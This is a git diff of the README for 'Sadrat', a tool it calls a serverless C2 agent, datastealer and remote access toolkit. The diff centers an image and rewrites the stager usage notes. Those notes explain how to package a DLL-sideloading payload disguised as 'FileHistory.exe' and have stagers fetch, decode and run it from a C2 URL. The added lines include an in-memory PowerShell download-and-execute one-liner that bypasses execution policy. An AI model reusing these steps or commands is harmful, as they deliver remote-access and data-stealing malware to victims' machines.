@@ -2,7 +2,9 @@
 
 ### Serverless C2 Agent, Datastealer and Remote Access Toolkit
 
-<img src="sadrat.webp" alt="Sadrat Hacker" width="300" height="300"/>
+<div style="text-align: center;">
+    <img src="images/sadrat.webp" alt="Sadrat Hacker" width="300" height="300"/>
+</div>
 
 #### Stagers
 Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. 
@@ -47,11 +49,13 @@ $exeName = "FileHistory.exe"
 
 ##### noparamStager.ps1 - Set the params as vars in the script to make remote execution easier
 ```powershell
-$url = "https://c2.serverless.com/api/assets/fhZip"
-$zipName = "fh.zip"
-$exeName = "FileHistory.exe"
+# edit before invoking
+notepad .\noParamStager.ps1 
+.\noParamStager.ps1 
 
-.\noParamStager.ps1 -url $url -zipName $zipName -exeName $exeName
+# exec in memory from remote share
+$url = ''
+powershell -ep bypass iex(iwr -uri $url)
 ```
 
 ##### azSadrat.ps1 - Run a Stager on Azure VM or over PS-Session 
